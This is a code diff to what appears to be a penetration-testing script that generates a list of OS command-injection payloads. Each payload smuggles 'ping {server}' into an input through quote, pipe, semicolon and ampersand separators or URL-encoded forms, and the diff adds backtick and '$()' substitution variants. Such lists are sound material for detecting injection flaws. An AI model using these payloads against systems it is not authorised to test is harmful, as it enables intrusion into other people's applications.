@@ -15,6 +15,8 @@ with open("OSIPGPayloads.txt", "w+") as file:
 " | ping {server} |
 " || ping {server} ||
 " ; ping {server} ;
+`ping {server}`
+$(ping {server})
 %26%20ping%20{server}%20%26
 %26%26%20ping%20{server}%20%26%26
 %7C%20ping%20{server}%20%7C
@@ -29,4 +31,6 @@ with open("OSIPGPayloads.txt", "w+") as file:
 %22%20%26%26%20ping%20{server}%20%26%26
 %22%20%7C%20ping%20{server}%20%7C
 %22%20%7C%7C%20ping%20{server}%20%7C%7C
-%22%20%3B%20ping%20{server}%20%3B""")
+%22%20%3B%20ping%20{server}%20%3B
+%60ping%20{server}%60
+%24%28ping%20{server}%29""")
